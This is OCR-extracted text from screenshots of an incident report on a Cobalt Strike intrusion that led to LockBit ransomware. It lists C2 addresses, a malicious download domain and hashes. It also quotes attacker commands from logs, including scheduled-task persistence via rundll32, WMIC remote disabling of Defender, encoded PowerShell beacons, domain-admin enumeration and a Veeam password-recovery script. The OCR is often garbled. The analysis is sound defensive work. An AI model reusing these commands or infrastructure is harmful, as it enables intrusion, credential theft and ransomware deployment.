> SR > C2: 91.142.74.28|3001  C2: user.compdatasystems.com  v File Creation: svemc.dll : Executed viaScheduled 9 MB" ® C2: 195.2.70.38|3001 DLL Task (Update2) i aac > C2: 38.180.61.247/3001 \g File Creation: svcmcc.dll > Bccutied viaSchecuicd aoe > C2: 185.236.232.20/445 Accessed to Execution of DLL Task (Update3) https://accessservicesonline setup_wm.exe  .com/setup_wm.exe

</details>

<details>
<summary><strong>Image 2</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_002_c663e3ec4e6e.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_002_c663e3ec4e6e.png)

**IOCs Found:**
- `accessservicesonline.com`
- `trojan.malware`

**Extracted Text:**
> @ =|  47 171 d8b2d883d3b376833fa8e2093e82d0a118ba1...  Last serving ip address Type Win32 EXE Size 1.93 MB First Seen 2023-12-20 21:52:34 25 Last Seen 2024-02-19 01:01:50 i Submissions 14 File Name setup_wm.exe Detections Deepinstinct MALICIOUS AVG Win32:Malware-gen Fortinet W32/PossibleThreat MaxSecure Trojan.Malware.1326835.susgen huorong Trojan/Generic!26A356F FO6BDEAA2  ... and 71 items more  ur 0 9 Click to select Double click to expand http://accessservicesonline.com/setup_wm.exe  &) Redir...

</details>

<details>
<summary><strong>Image 3</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_003_f1a3b98a7cee.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_003_f1a3b98a7cee.png)

**IOCs Found:**
- `accessservicesonline.com`

**Extracted Text:**
> Q | https://accessservicesonline.com/ Smart search 3= & fF ©) G  aa ©) 10/96 security vendors flagged this URL as malicious QO Follow  C Reanalyze Q Search 3% Graph 4 API /96 . . . https://accessservicesonline.com/ Last Analysis Date eS accessservicesonline.com 4 days ago S) Community Score DETECTION DETAILS RELATIONS CONTENT TELEMETRY COMMUNITY  Crowdsourced context ©  HIGH 1 MEDIUM 0 LOW 0 INFO O SUCCESS 0  A\ Activity related to COBALTSTRIKE - according to source Cluster25 - 8 months ago  Thi...

</details>

<details>
<summary><strong>Image 4</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_004_d7ea4912f68c.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_004_d7ea4912f68c.png)

**IOCs Found:**
- `process.pi`
- `process.parent`
- `process.name`

**Extracted Text:**
> t process.name  cmd.  omd .  cmd.  omd .  cmd.  omd .  cmd.  omd .  exe  exe  exe  exe  exe  exe  exe  exe  t process.command_line  C:\Windows\system32\cmd.  C:\Windows\system32\cmd.  C:\Windows\system32\cmd.  C:\Windows\system32\cmd.  C:\Windows\system32\cmd.  Windows\system32\cmd.  :\Windows\ system32\omd .  :\Windows\ system32\omd .  exe  exe  exe  exe  exe  exe  exe  exe  Ic  Ic  Ic  Ic  Ic  Ic  Ic  Ic  schtasks  schtasks  schtasks  schtasks  schtasks  schtasks  schtasks  schtasks  Jun  Jun...

</details>

<details>
<summary><strong>Image 5</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_005_a26dcd46bc0e.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_005_a26dcd46bc0e.png)

**IOCs Found:**
- `schtasks.exe`
- `process.name`

**Extracted Text:**
> t winlog.computer_name  Beach Head Host  File Share Server  Backup Server  t process.name  schtasks.  schtasks.  schtasks.  schtasks.  schtasks.  schtasks.  exe  exe  exe  exe  exe  exe  t process.command_tine  schtasks  schtasks  schtasks  schtasks  schtasks  "C:\Windows\system32\schtasks.exe” /create /ru SYSTEM /sc ONSTART /tn Update2 /tr “omd /c rund1132 C:\users\public\music\sveme.d11.  /create  /create  /create  /create  /create  dru  dru  dru  dru  dru  SYSTEM  SYSTEM  SYSTEM  SYSTEM  SYST...

</details>

<details>
<summary><strong>Image 6</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_006_59d3b27e1161.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_006_59d3b27e1161.png)

**IOCs Found:**
- `schemas.microsoft`

**Extracted Text:**
> <?xml version="1.0" encoding="UTF-16"?> <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"> <RegistrationInfo> <Date> </Date> <Author ‘</Author> </RegistrationInfo> <Triggers>  <BootTrigger> <StartBoundary>: )</StartBoundary> <Enabled>t rue</Enabled>  </BootTrigger>  </Triggers> <Settings>  <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>...

</details>

<details>
<summary><strong>Image 7</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_007_eef85190f9ac.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_007_eef85190f9ac.png)

**Extracted Text:**
> (>) setup_wm  () setup_wm Properties yx 3:48 PM General Compatibility Security Details Previous Versions 3:45 PM Property Value 8:41 PM Description Lane  File description Microsoft Windows Media Configuration ... Type Application  File version 12.0.7601.17514  Product name _ Microsoft® Windows® Operating System Product version 12.0.7601.17514  © Microsoft Corporation. All rights reserv... 1.93 MB  Date modified 2/16/2024 8:41 PM  Language English (United States)  Original filename setup_wm.exe

</details>

<details>
<summary><strong>Image 8</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_008_1e60bfede520.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_008_1e60bfede520.png)

**IOCs Found:**
- `mnc.exe`
- `mmc.exe`
- `b8ee2d6252332a68b70b22e3d6e377d2`
- `gpedit.msc`

**Extracted Text:**
> Process Create: technique_id=11204, technique_name=User Execution  RuleName UtcTime: ProcessGuid: {f3cacc6d-144c-65b9-662f-98000000900} ProcessId: 6732  Image: C:\Windows \System32\mme exe  FileVersion: 10.0.17763.1 (WinBuild. 160101 .6800 Description: Microsoft Management Console  Product: Microsofte Windows® Operating System Company: Microsoft Corporation  OriginalFileName: mmc.exe  CommandLine: "C:\Windows\system32\mnc.exe” “C:\Windows \System32\gpedit.msc” CurrentDirectory: E:\Shares\ \ User...

</details>

<details>
<summary><strong>Image 10</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_010_2da2009a69bf.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_010_2da2009a69bf.png)

**Extracted Text:**
> Registry value set: RuleName: technique_id=11562.001, technique_name=Disable or Modify Tools EventType: SetValue  UtcTime:  ProcessGuid: {f3caccéd-bdb2-6564-1da0-9e0000000900}  ProcessId: 1432  Image: C:\Windows\system32\ svchost .exe  TargetObject: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection \DisableRealtimeMonitoring  Details: DWORD (@x00000001)  User: NT AUTHORITY\SYSTEM

</details>

<details>
<summary><strong>Image 11</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_011_0894ac12c24f.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_011_0894ac12c24f.png)

**IOCs Found:**
- `process.parent`
- `host.name`
- `cmd.exe`

**Extracted Text:**
> >  >  Time +  WWMM, 2024 @ 19:39:28.909  WM, 2024 © 19:39:29.477  host.name  Beachhead Host  Beachhead Host  process.parent.executable  C:\Users\ \Downloads\setup _wm.exe  C:\Windows \SysWOW64\cmd. exe  process.command_line  C:\Windows\system32\cmd.exe /C wmic /node: Backup Host ' process call create "powershell Set-MpPreference -DisableRealtimeMonitoring Strue"  wnic /node: Backup Host process call create "powershell Set-MpPreference -DisableRealtimeMonitoring Strue"

</details>

<details>
<summary><strong>Image 12</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_012_eb0e8e3b554a.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_012_eb0e8e3b554a.png)

**Extracted Text:**
> CreateRemoteThread detected RuleName: technique_id=11055, technique_name=Process Injection UtcTime:  SourceProcessGuid: {d7fdf488-fe9b-65b8-cd14-010000000500) SourceProcessId: 13172  SourceImage: C:\Users\ \Downloads\setup_wm.exe TargetProcessGuid: {d7fdf488-0696-65b9-6c15-010000000500} TargetProcessId: 6760  TargetImage: C:\Windows\System32\wuauclt .exe  NewThreadId: 12328  StartAddress: @x9900000008420008  StartModule: -  StartFunction: -  SourceUser:  TargetUser:

</details>

<details>
<summary><strong>Image 13</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_013_8749fa07a077.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_013_8749fa07a077.png)

**IOCs Found:**
- `powershell.exe`
- `esrss.exe`

**Extracted Text:**
> k ActionType Yt ProcessCommandLine Yt InitiatingProcessCommandLine v  CreateRemoteThreadApiCall “powershell.exe" -noexit -command Set-Location -literalPath 'C:\Users\Public\Music' esrss.exe ObjectDirectory=\Windows SharedSection=1024, 20480, 768 Windows=On SubSystemType=Windows Serve... CreateRemoteThreadApiCall WUAUCLT . exe powershell -nop -w hidden -encodedcommand JABZAD@ATgB1AHCALQBPAGIAagB1AGMAdAAGAEKATWAUAE@AZQBtAGBACGBS... CreateRemoteThreadApiCall -k appmodel -p powershell -nop -w hidden...

</details>

<details>
<summary><strong>Image 14</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_014_47a98ad8058b.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_014_47a98ad8058b.png)

**IOCs Found:**
- `event.action`
- `process.name`
- `event.code`
- `event.provider`
- `lsass.exe`

**Extracted Text:**
> event.provider 7”  a~ Vv  Microsoft-  Windows-Sysmon  event.action + af  Process accessed (rule: ProcessAccess )  ra  event.code +  10  /  a  process.name +  WUAUCLT. exe  eA  winlog.event_data.TargetImage +  C: \Windows\system32\lsass.exe  winlog.event_data.GrantedAccess +  Qx1010

</details>

<details>
<summary><strong>Image 15</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_015_e754af8a684f.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_015_e754af8a684f.png)

**IOCs Found:**
- `ntdsutil.exe`

**Extracted Text:**
> message v  Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software  Windows Defender Antivirus has detected malware or other potentially unwanted software. For more information please see the followin...  Windows Defender Antivirus has detected malware or other potentially unwanted software. For more information please see the followin...  winlog.provider_name  Microsoft-Windows-Windows Defender  Microsoft-Windows-Windows Defender...

</details>

<details>
<summary><strong>Image 16</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_016_bfc3ac9683ca.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_016_bfc3ac9683ca.png)

**Extracted Text:**
> Creating Scriptblock text (1 of 1): -\Veeam-Get-Creds.ps1  ScriptBlock ID: 1a6d217d-8262-4d00-8dbb-eeSbacesacs4 Path

</details>

<details>
<summary><strong>Image 17</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_017_edfa8b174b42.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_017_edfa8b174b42.png)

**IOCs Found:**
- `system.security`

**Extracted Text:**
> Creating Scriptblock text (1 of 1): # About: The script is designed to recover passwords used by Veeam to connect # to remote hosts vSphere, Hyper-V, etc. The script is intended for demonstration and academic purposes. Use with permission from the system owner.  Author: Konstantin Burov.  Usage: Run as administrator (elevated) in PowerShell on a host in a Veeam server.  He ee  Add-Type -assembly System.Security  #Searching for connection parameters in the registry try {  SVeaamRegPath = “HKLM: \...

</details>

<details>
<summary><strong>Image 18</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_019_138519b15c3c.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_019_138519b15c3c.png)

**IOCs Found:**
- `powershell.exe`
- `process.pid`
- `process.name`
- `process.parent`
- `nltest.exe`
- `owershell.exe`

**Extracted Text:**
> t process.name t process.command_tine t process.parent.name t process.parent.command_line # process.pid # process.parent.pid  owershell.exe owershell -nop -exec bypass -EncodedCommani setup_wm.exe C:\Users\ \Downloads\setup_wm.exe 8,988 13,172 powershel] powershell -nop bypi ded d P. 4 ‘load Pp P bgBsAHQAZOBZAHQATAAVAGQAYWBSAGKACWBQADOA  nltest exe "C:\Windows\system32\nltest.exe” /delist: powershell.exe powershell -nop -exec bypass -EncodedCommand 8,892 8,988 bgBsAHQAZOBZAHOATAAVAGQAYWBSAGKACWB...

</details>

<details>
<summary><strong>Image 19</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_020_8068b0301b01.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_020_8068b0301b01.png)

**IOCs Found:**
- `net.exe`
- `powershell.exe`
- `process.pid`
- `process.name`
- `process.parent`
- `cmd.exe`
- `nltest.exe`
- `netl.exe`

**Extracted Text:**
> t process.name  cmd.exe  net.exe  netl.exe  powershell.exe  nltest.exe  t process.command_tine  C:\Windows\system32\cmd.exe /C net group “domain admins” /domain  net group “domain admins" /domain  C:\Windows\system32\net1 group “domain admins” /domain  powershell -nop -exec bypass -EncodedCommand bgBsAHQAZOBZAHQATAAVAGQAbWBtAGEAaQBUAF BAdABy AHUACWBOAHMAT. AAVAGEADABSAFSAdAByAHUACWBOAHMA  :\Windows\system32\nltest.exe” /domain_trusts Jall_trusts  t process.parent.name  setup_wm.exe  cmd.exe  net...

</details>

<details>
<summary><strong>Image 20</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_021_4a2e6444672d.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_021_4a2e6444672d.png)

**IOCs Found:**
- `wuauclt.exe`
- `lsass.exe`

**Extracted Text:**
> WUAUCLT .  WUAUCLT .  WUAUCLT .  WUAUCLT .  WUAUCLT .  WUAUCLT .  WUAUCLT .  WUAUCLT .  WUAUCLT .  WUAUCLT .  exe  exe  exe  exe  exe  exe  exe  exe  exe  exe  BEACHHEAD HOST  {"Description": "wuauclt.exe loaded CLR module Seatbelt"}  {"Description": "wuauclt.exe loaded CLR module SharpView"}  {"Description": "wuauclt.exe read lsass.exe process memory"} {"Description": "wuauclt.exe wrote into the process memory of lsass.exe"} {"DesiredAccess" : 2097151}  {"DesiredAccess": 4112}  {"DesiredAccess"...

</details>

<details>
<summary><strong>Image 21</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_022_ce7cfcd9f429.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_022_ce7cfcd9f429.png)

**IOCs Found:**
- `diskcheck.exe`
- `1.0.0.1`

**Extracted Text:**
> Process Create:  RuleName: technique_id=11204, technique_name=User Executio UtcTime:  ProcessGuid: {f3cacc6d-1b5a-65b9-912f-990000000900} ProcessId: 524  Image: C:\Users\Public\Music\check .exe  FileVersion: 1.0.0.1  Description: DiskChek Product: DiskChek  Company: -  OriginalFileName: DiskCheck.exe  CommandLine: "C:\Users\Public\Music\check exe  CurrentDirectory: C:\Users\Public\Music\  User  LogonGuid: {f8caccéd-f9e-65b9-95ad-6bae00000000)  LogonId: @xE6BAD95  TerminalsessionId: 3  IntegrityL...

</details>

<details>
<summary><strong>Image 22</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_023_7d69ac4aa410.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_023_7d69ac4aa410.png)

**IOCs Found:**
- `10.211.55.3`

**Extracted Text:**
> x +  G © »> = Lockbit > Files > check  oO (5 BD S WW WN Sotv = Viewr eee Name Date modified gl DiskCheck _ x “Ml check 2/16/2024 8:48 PM 10.211.55.3 computers 11/23/2024 11:21 PM DeadPc 11/23/2024 11:21 PM Fel diskSpace 11/23/2024 11:21 PM Error 11/23/2024 11:21 PM LivePc 11/23/2024 11:21 PM Fal Programs 11/23/2024 11:21 PM  Check complete  X  w Success!!!

</details>

<details>
<summary><strong>Image 23</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_024_e2166065b8dc.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_024_e2166065b8dc.png)

**IOCs Found:**
- `allwindows.csv`

**Extracted Text:**
> Creating Scriptblock text (1 of 1  Powershell Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq Strue} -propertie 5 *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV c:\users\public\music\AllWindows.csv -NoTypeInformation -Encoding UTF8  ScriptBlock ID: 911ffd15-54c9-43F9-963a-a9c49ad33011 Path

</details>

<details>
<summary><strong>Image 24</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_025_845ec222ffc6.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_025_845ec222ffc6.png)

**IOCs Found:**
- `explorer.exe`
- `taskmgr.exe`
- `process.pid`
- `process.name`
- `process.parent`

**Extracted Text:**
> t process.name t process.command_tine  t process.parent.name { process.parent.command_tine # process.pid # process.parent.pid Taskmgr .exe "C:\Windows\system32\taskmgr.exe” /4 explorer.exe C:\Windows\ Explorer .EXE 1,492 1,420 Taskmgr .exe :\Windows\system32\taskmgr.exe” /4 explorer.exe C:\Windows\ Explorer .EXE 6,496 1,420  Taskmgr .exe "C:\Windows\system32\taskmgr.exe” /4 explorer.exe C:\Windows\ Explorer .EXE 6,228 1,420

</details>

<details>
<summary><strong>Image 25</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_026_80ea825cfe5d.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_026_80ea825cfe5d.png)

**IOCs Found:**
- `powershell.exe`
- `explorer.exe`
- `process.pid`
- `process.name`
- `mnc.exe`
- `process.parent`
- `mmc.exe`
- `gpedit.msc`

**Extracted Text:**
> { process.name t process.command_tine { process.parent.name { process.parent.command_line # process.pid # process.parent.pid  mmc .exe "C:\Windows\system32\mnc.exe” “C:\Windows\System32\gpedit.msc” explorer.exe C:\Windows\ Explorer .EXE 6,732 1,420  mmc .exe "C:\Windows\system32\mmc.exe”  :\Windows\system32\gpedit.msc” _ powershell.exe "C:\Windows\System32\WindowsPowerShell\v1.@\powershell.exe” - 14,908 39,452 noexit -command Set-Location -literalPath ‘C:\share$”

</details>

<details>
<summary><strong>Image 26</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_027_a3a289694ef7.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_027_a3a289694ef7.png)

**Extracted Text:**
> RDP Lateral Movement Activity  Day 11 RDP Backup Server aan hy ~~. I | \ ‘ \ Beach Head _~ Day 1 and 2 RDP ee \ ~eL | Day II RDP _ 1 ma } SL «fo =)  File Server

</details>

<details>
<summary><strong>Image 27</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_028_615122a52d2a.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_028_615122a52d2a.png)

**IOCs Found:**
- `result.keyword`
- `destination.ip`
- `event.dataset`
- `source.ip`
- `zeek.rdp`

**Extracted Text:**
> event.dataset. keyword: Descending source.ip.keyword: Descending destination.ip.keyword: Descending  zeek.rdp.result.keyword: Descending zeek.rdp.security_protocol.keyword: Descending zeek.rdp 10 12 10. 15 encrypted HYBRID_EX  zeek.rdp 10 113 10. 15 encrypted HYBRID_EX  zeek.rdp 10 113 10. 612  encrypted HYBRID_EX

</details>

<details>
<summary><strong>Image 28</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_029_cb570d887894.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_029_cb570d887894.png)

**Extracted Text:**
> Remote Desktop Services: Session logon succeeded:  \Administrator 14 Source Network Address: 10 113

</details>

<details>
<summary><strong>Image 29</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_030_9969ce31ece2.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_030_9969ce31ece2.png)

**Extracted Text:**
> Creating Scriptblock text (1 of 1): New-PSSession -local  ScriptBlock ID: faaabdd6-Gaa0-412b-9c88-92530e0Fca5e Path

</details>

<details>
<summary><strong>Image 30</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_032_829f61c93f8f.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_032_829f61c93f8f.png)

**IOCs Found:**
- `1.0.0.0`

**Extracted Text:**
> Context:  Severity = I  nformational  Host Name =  ServerRemoteHost  Host Version Host ID = 4d Host Applica Engine Versi Runspace ID Pipeline ID Command Name Command Type Script Name Command Path Sequence Num User =  Connected Us Shell ID = M  = 1.0.0.0 jedbed2-8d47-41e1-b862-7648F153674b  ytiion = C:\Windows \system32\wsmprovhost exe -Embedding  on = 5.1.17763.4974 4b9c3c8c-1735-4488-b860-d17b22b2d89e  =1  = Get-Command  = cmdlet  ber = 36  er = |icrosoft .PowerShell

</details>

<details>
<summary><strong>Image 31</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_033_97a643f09487.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_033_97a643f09487.png)

**IOCs Found:**
- `omd.exe`
- `process.parent`
- `process.name`

**Extracted Text:**
> t process.name t process.command_tine { process.parent.name  WHIC. exe wmic /node process call create "powershell Set-MpPreference -DisableRealtimeMonitoring $true” omd.exe

</details>

<details>
<summary><strong>Image 32</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_034_aa25fd3af78a.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_034_aa25fd3af78a.png)

**IOCs Found:**
- `event.dataset`
- `related.ip`
- `source.ip`

**Extracted Text:**
> t event.dataset t related.ip t source.ip  t zeek.smb_files.  ¢ zeek.smb_files.path action  zeek.smb_files 18 113 19. 16 SMB::FILE_OPEN — \\ \c$ users\public\music\svomec .d11.

</details>

<details>
<summary><strong>Image 33</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_035_2a69bf8f1376.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_035_2a69bf8f1376.png)

**IOCs Found:**
- `event.code`

**Extracted Text:**
> t event.code t winlog.event_data.Account —¢_ winlog.event_data.ServiceName t winlog.event_data.imagePath Name  7045 Localsystem b609486 omd /c rund1132 C:\users\public\music\svem.d11, LaunchZo  7045 Localsystem S6dedeb md /c rund1132 C:\users\public\music\svemee.d11, LaunchZo

</details>

<details>
<summary><strong>Image 34</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_036_b9f062056580.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_036_b9f062056580.png)

**IOCs Found:**
- `destination.ip`
- `suricata.eve`
- `source.ip`
- `alert.signature`

**Extracted Text:**
> t source.ip t destination.ip __rule.category t suricata.eve.alert.signature  18. 113 10 10 Attempted User Privilege Gain ET RPC DCERPC SVCCTL - Remote Service Control Manager Access  18. 113 10 10 Attempted User Privilege Gain ET RPC DCERPC SVCCTL - Remote Service Control Manager Access

</details>

<details>
<summary><strong>Image 35</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_037_8132200beda4.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_037_8132200beda4.png)

**IOCs Found:**
- `event.code`

**Extracted Text:**
> t event.code  7045  7045  7045  7045  7045  t winlog.event_data.Account Name  Localsystem  Localsystem  Localsystem  Localsystem  Localsystem  t winlog.event_data.ServiceName  4711f9a  c99F4b5  A2eeb84  b7abbo4  83e9cd7  t winlog.event_data.ImagePath  %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABZAD@ATgBIAHCALQBPAGIAagB1AGMAAAgAEKATWAUAEGAZQBtAGBACgBSAFMAdABy AGUAYQBt ACgALABbAEMADWBUAHYAZQI ASAA@AHMASQBBAEEAQQBBAEEAQQBBAEEALWA2ADEAVWB1 AFGAUABhAEBAQGBEACSASABIADY A...

</details>

<details>
<summary><strong>Image 36</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_038_1070895fbd60.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_038_1070895fbd60.png)

**IOCs Found:**
- `system.runtime`
- `interopservices.marshal`

**Extracted Text:**
> Recipe A @ B® €@ input +O3 8 &  Nn | | eee ee eee eee ee ee ee eee reese eee ESE ee ete esse tate DOSES ees SSSESESESESSESESESESE SESE SOOTHE SESE SERS —~ § seeseseseeseeeeESEessse tet sseeeessEee teres eSeSeSeEseseseses dere sereteseseesereseseseeees: From BaseG4 8 Qv08Q0e53GmD2wpdo/dGzgsDovS2XswWVM3WgpMZd LIBpURfcydDLPAKmacRF rMVd@NG8y j 501 LUDQW1Tk5yJ8 LWGEj sOVmALR/R2YqqB+5KuMicVNfr Alphabet BL9hP5i+elcPhaCBSr+LbaqqUtLVnP LUmhb6hu4 fqKCFm/mSEoW+otNZsc34HLOOWFZH5AECqgauPutxgnUERWFNf GUaX74Y1...

</details>

<details>
<summary><strong>Image 37</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_039_5b33d58d6cd8.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_039_5b33d58d6cd8.png)

**Extracted Text:**
> ~aBs  a Oe ||  Recipe  Regular expression  Regex  [a—zA-Z0—-9+/=] {30, }  Built in regexes  User defined  Case insensitive “ and $ match at newlines — [] Dot matches all  Output format  | Unicode support | Astral support | Display total List matches  From Base64 ~ Ol Alphabet . A-Za-z0-9+/= . Remove non-alphabet chars [C] Strict mode  Gunzip ~ Ol  Label ~ Ol Name Decode  Regular expression ~ Ol  Regex  [a—zA-Z0—-9+/=] {30, }  Built in regexes  User defined  Case insensitive “ and $ match at newl...

</details>

<details>
<summary><strong>Image 38</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_040_488497c5791a.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_040_488497c5791a.png)

**Extracted Text:**
> Found shellcode Identification:  Parameter  CS psexec psh x86 shellcode, opens named pipe  license-id: 367 1357776117 148 261  push push  @0o00000: FC @oo00010: 52 000002 2000003 a0000040: Do 0000050: 01 a0000060: 03 a0000070: oc a000080: 5B a0000090: 31 a0o000Aa: 68 0000080: 51 a0o000co: 6A aoooaope: 52 @00000E0: 6A a00000F0: 6A a0o00100: 24 90000110: BB 00000120: 89 00000130: 68 0000140: 04 0000150: D5  aoo00160: 70 00000170: 00  Eg ac 3c 52 50 D6 7D 4B 5B co 58 51 03 68 00 00 10 F  04 co 24 F...

</details>

<details>
<summary><strong>Image 39</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_041_6b4afc35c89d.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_041_6b4afc35c89d.png)

**Extracted Text:**
> CreateRemoteThread detected: RuleName: technique_id=11055, technique_name=Process Injection UteTime:  SourceProcessGuid: {f3caccéd-ad12-65b9-e92e-000000000900} SourceProcessId: 4128  Sourcelmage: C:\Windows\SysWOW64\WindowsPowerShel1\v1 .@\powershell. exe TargetProcessGuid: {f3caccéd-beb7-6564-2500-000000000900} TargetProcessId:| 2296 TargetImage: C:\Windows \system32\svchost .exe NewThreadId: 292  StartAddress: x900000001DBE9008 StartModule: -  StartFunction: -  SourceUser: NT AUTHORITY\SYSTEM...

</details>

<details>
<summary><strong>Image 40</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_043_37a5780e48eb.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_043_37a5780e48eb.png)

**Extracted Text:**
